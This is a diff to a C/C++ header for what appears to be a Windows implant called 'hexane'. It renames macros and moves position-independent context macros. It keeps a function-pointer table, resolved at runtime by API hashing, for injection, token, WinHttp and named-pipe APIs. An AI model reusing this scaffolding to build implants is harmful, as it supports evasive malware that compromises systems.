@@ -32,17 +32,14 @@ EXTERN_C LPVOID InstEnd();
 #define U_PTR(x)                                (R_CAST(UINT_PTR, x))
 #define C_DREF(x)                               (*R_CAST(VOID**, x))
 
-#define FUNCTION								TXT_SECTION(B)
-#define PROTOTYPE(x)                            __typeof__(x) *x
-#define DLL_EXPORT 								__declspec(dllexport)
-#define TXT_SECTION(x) 							__attribute__((used, section(".text$" #x "")))
-#define DATA_SECTION  							__attribute__((used, section(".data")))
-#define RDATA_SECTION  							__attribute__((used, section(".rdata")))
+#define FUNCTION								_text(B)
+#define _prototype(x)                           __typeof__(x) *x
+#define _dllexport 								__declspec(dllexport)
+#define _code_seg(x)							__attribute__((used, section(x)))
+#define _text(x) 								__attribute__((used, section(".text$" #x "")))
 #define WEAK									__attribute__((weak))
 
-#define LocalHeap								NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap
 #define ntstatus 								Ctx->Teb->LastErrorValue
-
 #define PS_ATTR_LIST_SIZE(n)					(sizeof(PS_ATTRIBUTE_LIST) + (sizeof(PS_ATTRIBUTE) * (n - 1)))
 #define MODULE_NAME(mod)						(mod->BaseDllName.Buffer)
 
@@ -172,6 +169,52 @@ typedef NTSTATUS (NTAPI* NtTestAlert_t)(VOID);
 typedef NTSTATUS (NTAPI* TpAllocWork_t)(PTP_WORK* ptpWork, PTP_WORK_CALLBACK callback, PVOID optArgs, PTP_CALLBACK_ENVIRON cbEnviron);
 typedef VOID (NTAPI* TpPostWork_t)(PTP_WORK ptpWork);
 typedef VOID (NTAPI* TpReleaseWork_t)(PTP_WORK ptpWork);
+
+
+WEAK EXTERN_C uint32_t		__global;
+#define GLOBAL_OFFSET       (U_PTR(InstStart()) + U_PTR(&__global))
+#define HEXANE 		        _hexane* Ctx = R_CAST(_hexane*, C_DREF(GLOBAL_OFFSET));
+
+#define InitializeObjectAttributes(ptr, name, attr, root, sec )	\
+    (ptr)->Length = sizeof( OBJECT_ATTRIBUTES );				\
+    (ptr)->RootDirectory = root;								\
+    (ptr)->Attributes = attr;									\
+    (ptr)->ObjectName = name;									\
+    (ptr)->SecurityDescriptor = sec;							\
+    (ptr)->SecurityQualityOfService = NULL
+
+
+#define MmPatchData(iter, dst, d_iter, src, s_iter, n)	\
+	for (int iter = 0; iter < n; iter++) {           	\
+		(dst)[d_iter] = (src)[s_iter];					\
+		__asm("");  									\
+	}
+
+
+#define ZeroFreePtr(x, n) 						\
+	x_memset(x, 0, n); 							\
+	Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, x);		\
+	x = nullptr
+
+
+#define F_PTR_HMOD(Fn, hmod, sym_hash) 	\
+	Fn = (__typeof__(Fn)) Memory::Modules::GetExportAddress(hmod, sym_hash)
+
+
+#define F_PTR_HASHES(Fn, mod_hash, sym_hash) \
+	Fn = (__typeof__(Fn)) Memory::Modules::GetExportAddress(Memory::Modules::GetModuleAddress(Memory::Modules::GetModuleEntry(mod_hash)), sym_hash)
+
+
+#define M_PTR(mod_hash) \
+	Memory::Modules::GetModuleAddress(Memory::Modules::GetModuleEntry(mod_hash))
+
+
+#define NT_ASSERT(Fn)	\
+	Fn; if (NtCurrentTeb()->LastErrorValue != ERROR_SUCCESS) return
+
+
+#define return_defer(x)	\
+	ntstatus = x; goto defer
 
 
 enum MessageType {
@@ -454,147 +497,101 @@ struct _hexane{
 	} CLR;
 
 	struct {
-		PROTOTYPE(LoadLibraryA);
-		PROTOTYPE(FreeLibrary);
-		PROTOTYPE(GetProcessHeap);
-		PROTOTYPE(GetProcessHeaps);
-		PROTOTYPE(GetProcAddress);
-		PROTOTYPE(GetModuleHandleA);
+		_prototype(LoadLibraryA);
+		_prototype(FreeLibrary);
+		_prototype(GetProcessHeap);
+		_prototype(GetProcessHeaps);
+		_prototype(GetProcAddress);
+		_prototype(GetModuleHandleA);
 
-		PROTOTYPE(IsWow64Process);
-        PROTOTYPE(OpenProcess);
-		PROTOTYPE(CreateToolhelp32Snapshot);
-		PROTOTYPE(Process32First);
-		PROTOTYPE(Process32Next);
-        PROTOTYPE(Module32First);
-        PROTOTYPE(Module32Next);
-		PROTOTYPE(GetCurrentProcessId);
-		PROTOTYPE(GetProcessId);
-		PROTOTYPE(ImpersonateLoggedOnUser);
-		PROTOTYPE(AdjustTokenPrivileges);
+		_prototype(IsWow64Process);
+        _prototype(OpenProcess);
+		_prototype(CreateToolhelp32Snapshot);
+		_prototype(Process32First);
+		_prototype(Process32Next);
+        _prototype(Module32First);
+        _prototype(Module32Next);
+		_prototype(GetCurrentProcessId);
+		_prototype(GetProcessId);
+		_prototype(ImpersonateLoggedOnUser);
+		_prototype(AdjustTokenPrivileges);
 
-		PROTOTYPE(GlobalMemoryStatusEx);
-		PROTOTYPE(GetComputerNameExA);
-		PROTOTYPE(SetLastError);
-		PROTOTYPE(GetLastError);
+		_prototype(GlobalMemoryStatusEx);
+		_prototype(GetComputerNameExA);
+		_prototype(SetLastError);
+		_prototype(GetLastError);
 
-        PROTOTYPE(RegOpenKeyExA);
-        PROTOTYPE(RegCreateKeyExA);
-        PROTOTYPE(RegSetValueExA);
-        PROTOTYPE(RegCloseKey);
+        _prototype(RegOpenKeyExA);
+        _prototype(RegCreateKeyExA);
+        _prototype(RegSetValueExA);
+        _prototype(RegCloseKey);
 
-		PROTOTYPE(ReadFile);
-		PROTOTYPE(WriteFile);
-		PROTOTYPE(CreateFileW);
-		PROTOTYPE(GetFileSizeEx);
-		PROTOTYPE(GetFullPathNameA);
-		PROTOTYPE(FindFirstFileA);
-		PROTOTYPE(FindClose);
-		PROTOTYPE(FindNextFileA);
-		PROTOTYPE(GetCurrentDirectoryA);
-		PROTOTYPE(FileTimeToSystemTime);
-		PROTOTYPE(SystemTimeToTzSpecificLocalTime);
-		PROTOTYPE(GetLocalTime);
-		PROTOTYPE(GetSystemTimeAsFileTime);
+		_prototype(ReadFile);
+		_prototype(WriteFile);
+		_prototype(CreateFileW);
+		_prototype(GetFileSizeEx);
+		_prototype(GetFullPathNameA);
+		_prototype(FindFirstFileA);
+		_prototype(FindClose);
+		_prototype(FindNextFileA);
+		_prototype(GetCurrentDirectoryA);
+		_prototype(FileTimeToSystemTime);
+		_prototype(SystemTimeToTzSpecificLocalTime);
+		_prototype(GetLocalTime);
+		_prototype(GetSystemTimeAsFileTime);
 
-		PROTOTYPE(FormatMessageA);
-		PROTOTYPE(CreateRemoteThread);
-		PROTOTYPE(CreateThread);
-		PROTOTYPE(QueueUserAPC);
-		PROTOTYPE(GetThreadLocale);
-		PROTOTYPE(SleepEx);
+		_prototype(FormatMessageA);
+		_prototype(CreateRemoteThread);
+		_prototype(CreateThread);
+		_prototype(QueueUserAPC);
+		_prototype(GetThreadLocale);
+		_prototype(SleepEx);
 
-		PROTOTYPE(WinHttpOpen);
-		PROTOTYPE(WinHttpConnect);
-		PROTOTYPE(WinHttpOpenRequest);
-		PROTOTYPE(WinHttpAddRequestHeaders);
-		PROTOTYPE(WinHttpSetOption);
-		PROTOTYPE(WinHttpGetProxyForUrl);
-		PROTOTYPE(WinHttpGetIEProxyConfigForCurrentUser);
-		PROTOTYPE(WinHttpSendRequest);
-		PROTOTYPE(WinHttpReceiveResponse);
-		PROTOTYPE(WinHttpReadData);
-		PROTOTYPE(WinHttpQueryHeaders);
-		PROTOTYPE(WinHttpQueryDataAvailable);
-		PROTOTYPE(WinHttpCloseHandle);
-		PROTOTYPE(GetAdaptersInfo);
+		_prototype(WinHttpOpen);
+		_prototype(WinHttpConnect);
+		_prototype(WinHttpOpenRequest);
+		_prototype(WinHttpAddRequestHeaders);
+		_prototype(WinHttpSetOption);
+		_prototype(WinHttpGetProxyForUrl);
+		_prototype(WinHttpGetIEProxyConfigForCurrentUser);
+		_prototype(WinHttpSendRequest);
+		_prototype(WinHttpReceiveResponse);
+		_prototype(WinHttpReadData);
+		_prototype(WinHttpQueryHeaders);
+		_prototype(WinHttpQueryDataAvailable);
+		_prototype(WinHttpCloseHandle);
+		_prototype(GetAdaptersInfo);
 
-		PROTOTYPE(CryptStringToBinaryA);
-		PROTOTYPE(CryptBinaryToStringA);
-		PROTOTYPE(FindResourceA);
-		PROTOTYPE(LoadResource);
-		PROTOTYPE(LockResource);
-		PROTOTYPE(SizeofResource);
-		PROTOTYPE(FreeResource);
+		_prototype(CryptStringToBinaryA);
+		_prototype(CryptBinaryToStringA);
+		_prototype(FindResourceA);
+		_prototype(LoadResource);
+		_prototype(LockResource);
+		_prototype(SizeofResource);
+		_prototype(FreeResource);
 
-		PROTOTYPE(CallNamedPipeW);
-		PROTOTYPE(CreateNamedPipeW);
-		PROTOTYPE(WaitNamedPipeW);
-		PROTOTYPE(SetNamedPipeHandleState);
-		PROTOTYPE(ConnectNamedPipe);
-		PROTOTYPE(TransactNamedPipe);
-		PROTOTYPE(DisconnectNamedPipe);
-		PROTOTYPE(PeekNamedPipe);
+		_prototype(CallNamedPipeW);
+		_prototype(CreateNamedPipeW);
+		_prototype(WaitNamedPipeW);
+		_prototype(SetNamedPipeHandleState);
+		_prototype(ConnectNamedPipe);
+		_prototype(TransactNamedPipe);
+		_prototype(DisconnectNamedPipe);
+		_prototype(PeekNamedPipe);
 
-		PROTOTYPE(GetUserNameA);
-		PROTOTYPE(LookupAccountSidW);
-		PROTOTYPE(LookupPrivilegeValueA);
-		PROTOTYPE(SetEntriesInAclA);
-		PROTOTYPE(AllocateAndInitializeSid);
-		PROTOTYPE(AddMandatoryAce);
-		PROTOTYPE(InitializeSecurityDescriptor);
-		PROTOTYPE(SetSecurityDescriptorDacl);
-		PROTOTYPE(SetSecurityDescriptorSacl);
-		PROTOTYPE(InitializeAcl);
-		PROTOTYPE(FreeSid);
+		_prototype(GetUserNameA);
+		_prototype(LookupAccountSidW);
+		_prototype(LookupPrivilegeValueA);
+		_prototype(SetEntriesInAclA);
+		_prototype(AllocateAndInitializeSid);
+		_prototype(AddMandatoryAce);
+		_prototype(InitializeSecurityDescriptor);
+		_prototype(SetSecurityDescriptorDacl);
+		_prototype(SetSecurityDescriptorSacl);
+		_prototype(InitializeAcl);
+		_prototype(FreeSid);
 
 	} win32;
-
 };
-
-EXTERN_C WEAK ULONG  		__InstanceOffset;
-#define GLOBAL_OFFSET       (U_PTR(InstStart()) + U_PTR(&__InstanceOffset))
-#define HEXANE 		        _hexane* Ctx = R_CAST(_hexane*, C_DREF(GLOBAL_OFFSET));
-
-#define InitializeObjectAttributes(ptr, name, attr, root, sec )	\
-    (ptr)->Length = sizeof( OBJECT_ATTRIBUTES );				\
-    (ptr)->RootDirectory = root;								\
-    (ptr)->Attributes = attr;									\
-    (ptr)->ObjectName = name;									\
-    (ptr)->SecurityDescriptor = sec;							\
-    (ptr)->SecurityQualityOfService = NULL
-
-
-#define MmPatchData(iter, dst, d_iter, src, s_iter, n)	\
-	for (int iter = 0; iter < n; iter++) {           	\
-		(dst)[d_iter] = (src)[s_iter];					\
-		__asm("");  									\
-	}
-
-
-#define ZeroFreePtr(x, n) 						\
-	x_memset(x, 0, n); 							\
-	Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, x);		\
-	x = nullptr
-
-
-#define F_PTR_HMOD(Fn, hmod, sym_hash) 	\
-	Fn = (__typeof__(Fn)) Memory::Modules::GetExportAddress(hmod, sym_hash)
-
-
-#define F_PTR_HASHES(Fn, mod_hash, sym_hash) \
-	Fn = (__typeof__(Fn)) Memory::Modules::GetExportAddress(Memory::Modules::GetModuleAddress(Memory::Modules::GetModuleEntry(mod_hash)), sym_hash)
-
-
-#define M_PTR(mod_hash) \
-	Memory::Modules::GetModuleAddress(Memory::Modules::GetModuleEntry(mod_hash))
-
-
-#define NT_ASSERT(Fn)	\
-	Fn; if (NtCurrentTeb()->LastErrorValue != ERROR_SUCCESS) return
-
-
-#define return_defer(x)	\
-	ntstatus = x; goto defer
 
 #endif
